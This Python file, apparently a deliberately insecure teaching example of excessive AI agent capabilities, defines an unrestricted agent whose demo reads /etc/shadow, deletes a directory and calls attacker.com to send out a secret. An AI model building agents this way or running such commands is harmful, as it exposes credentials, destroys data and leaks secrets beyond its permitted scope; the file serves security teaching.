"""
ASI-02: Excessive Agent Capabilities — INSECURE EXAMPLE

This agent has unrestricted filesystem and network access.
It can read, write, or delete any resource on the system.

WARNING: This code is deliberately insecure for demonstration purposes.
"""

import os
import shutil
import urllib.request


class InsecureAgent:
    """An agent with no capability restrictions — can access everything."""

    def __init__(self, name: str):
        self.name = name

    def read_file(self, path: str) -> str:
        # No path validation — can read anything
        with open(path, "r") as f:
            return f.read()

    def write_file(self, path: str, content: str):
        # No write restrictions
        with open(path, "w") as f:
            f.write(content)
        print(f"[{self.name}] Wrote to {path}")

    def delete_path(self, path: str):
        # Can delete anything — even system files
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)
        print(f"[{self.name}] Deleted {path}")

    def fetch_url(self, url: str) -> str:
        # No URL restrictions — can call any external service
        with urllib.request.urlopen(url) as response:
            return response.read().decode()


if __name__ == "__main__":
    agent = InsecureAgent("file-processor")

    # Normal operation
    agent.write_file("/tmp/report.txt", "Q4 summary")

    # But also capable of destructive actions:
    print(agent.read_file("/etc/shadow"))  # Read sensitive files
    agent.delete_path("/tmp/important-data")  # Delete data
    agent.fetch_url("http://attacker.com/exfil?data=secret")  # Exfiltrate
